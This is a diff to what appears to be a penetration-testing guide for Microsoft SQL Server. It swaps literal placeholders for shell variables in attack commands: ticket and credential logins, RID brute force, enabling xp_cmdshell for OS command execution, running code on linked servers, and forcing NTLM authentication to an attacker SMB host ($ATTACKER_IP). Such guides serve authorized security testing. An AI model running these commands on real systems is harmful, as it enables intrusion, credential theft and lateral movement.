@@ -120,11 +120,11 @@ If MSSQL is configured for Windows Authentication, you can use Windows credentia
 
 ```bash
 # With Windows credentials
-mssqlclient.py -p 1433 'DOMAIN/username:password'@'$TARGET' -windows-auth
+mssqlclient.py -p 1433 '$DOMAIN/$USER:$PASSWORD'@'$TARGET' -windows-auth
 
 # With Kerberos ticket
 export KRB5CCNAME=/path/to/ticket.ccache
-mssqlclient.py -p 1433 'DOMAIN/username'@'$TARGET' -windows-auth -k
+mssqlclient.py -p 1433 '$DOMAIN/$USER'@'$TARGET' -windows-auth -k
 ```
 
 ## Database enumeration
@@ -139,13 +139,13 @@ Once authenticated, enumerate databases, tables, and users.
 
 ```bash
 # Connect with SQL authentication
-mssqlclient.py -p 1433 'username'@'$TARGET'
+mssqlclient.py -p 1433 '$USER'@'$TARGET'
 
 # Connect with Windows authentication
-mssqlclient.py -p 1433 'DOMAIN/username'@'$TARGET' -windows-auth
+mssqlclient.py -p 1433 '$DOMAIN/$USER'@'$TARGET' -windows-auth
 
 # Connect with password
-mssqlclient.py -p 1433 'username:password'@'$TARGET'
+mssqlclient.py -p 1433 '$USER:$PASSWORD'@'$TARGET'
 ```
 
 Once connected, useful commands:
@@ -176,10 +176,10 @@ SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
 
 ```bash
 # Connect
-sqsh -S $TARGET -U username -P password
+sqsh -S $TARGET -U $USER -P $PASSWORD
 
 # Execute query
-sqsh -S $TARGET -U username -P password -C "SELECT @@version"
+sqsh -S $TARGET -U $USER -P $PASSWORD -C "SELECT @@version"
 ```
 
 === sqlcmd
@@ -188,10 +188,10 @@ sqsh -S $TARGET -U username -P password -C "SELECT @@version"
 
 ```bash
 # Connect
-sqlcmd -S $TARGET -U username -P password
+sqlcmd -S $TARGET -U $USER -P $PASSWORD
 
 # Execute query
-sqlcmd -S $TARGET -U username -P password -Q "SELECT @@version"
+sqlcmd -S $TARGET -U $USER -P $PASSWORD -Q "SELECT @@version"
 ```
 
 === NetExec
@@ -200,19 +200,19 @@ sqlcmd -S $TARGET -U username -P password -Q "SELECT @@version"
 
 ```bash
 # Execute SQL query (use --local-auth for SQL Server Authentication)
-netexec mssql $TARGET -u username -p password -q "SELECT @@version"
+netexec mssql $TARGET -u $USER -p $PASSWORD -q "SELECT @@version"
 
 # Query databases
-netexec mssql $TARGET -u username -p password -q "SELECT name FROM sys.databases;"
+netexec mssql $TARGET -u $USER -p $PASSWORD -q "SELECT name FROM sys.databases;"
 
 # Enumerate users that can be impersonated
-netexec mssql $TARGET -u username -p password -M enum_impersonate
+netexec mssql $TARGET -u $USER -p $PASSWORD -M enum_impersonate
 
 # Enumerate active MSSQL logins
-netexec mssql $TARGET -u username -p password -M enum_logins
+netexec mssql $TARGET -u $USER -p $PASSWORD -M enum_logins
 
 # RID brute force to enumerate users (only works if MSSQL runs on a Windows Domain Controller or if MSSQL exposes SAM lookup)
-netexec mssql $TARGET -u username -p password --rid-brute
+netexec mssql $TARGET -u $USER -p $PASSWORD --rid-brute
 ```
 
 :::
@@ -253,10 +253,10 @@ RECONFIGURE;
 
 ```bash
 # Execute command using xp_cmdshell
-netexec mssql $TARGET -u sa -p 'password' -x whoami
+netexec mssql $TARGET -u sa -p '$PASSWORD' -x whoami
 
 # Enable xp_cmdshell via SQL query
-netexec mssql $TARGET -u sa -p 'password' -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+netexec mssql $TARGET -u sa -p '$PASSWORD' -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 ```
 
 === sp_OACreate
@@ -328,16 +328,16 @@ EXEC sp_serveroption 'linked_server_name', 'rpc out', 'true';
 
 ```bash
 # Enumerate linked MSSQL servers
-netexec mssql $TARGET -u username -p password -M enum_links
+netexec mssql $TARGET -u $USER -p $PASSWORD -M enum_links
 
 # Execute SQL queries on a linked server
-netexec mssql $TARGET -u username -p password -M exec_on_link -o LINKED_SERVER="linked_server_name" -o QUERY="SELECT @@version"
+netexec mssql $TARGET -u $USER -p $PASSWORD -M exec_on_link -o LINKED_SERVER="linked_server_name" -o QUERY="SELECT @@version"
 
 # Enable/Disable xp_cmdshell on a linked server
-netexec mssql $TARGET -u username -p password -M link_enable_cmdshell -o LINKED_SERVER="linked_server_name" -o ENABLE=true
+netexec mssql $TARGET -u $USER -p $PASSWORD -M link_enable_cmdshell -o LINKED_SERVER="linked_server_name" -o ENABLE=true
 
 # Execute shell commands on a linked server
-netexec mssql $TARGET -u username -p password -M link_xpcmd -o LINKED_SERVER="linked_server_name" -o COMMAND="whoami"
+netexec mssql $TARGET -u $USER -p $PASSWORD -M link_xpcmd -o LINKED_SERVER="linked_server_name" -o COMMAND="whoami"
 ```
 
 :::
@@ -352,10 +352,10 @@ MSSQL can be used to force authentication to an attacker-controlled SMB server t
 
 ```sql
 -- Force authentication to attacker SMB server
-EXEC xp_dirtree '\\attacker_ip\share', 1, 1;
+EXEC xp_dirtree '\\$ATTACKER_IP\share', 1, 1;
 
 -- Or using xp_fileexist
-EXEC xp_fileexist '\\attacker_ip\share\file.txt';
+EXEC xp_fileexist '\\$ATTACKER_IP\share\file.txt';
 ```
 
 === NetExec
@@ -364,7 +364,7 @@ EXEC xp_fileexist '\\attacker_ip\share\file.txt';
 
 ```bash
 # Coerce authentication using MSSQL
-netexec mssql $TARGET -u username -p password -M mssql_coerce -o LISTENER="attacker_ip"
+netexec mssql $TARGET -u $USER -p $PASSWORD -M mssql_coerce -o LISTENER="$ATTACKER_IP"
 ```
 
 :::
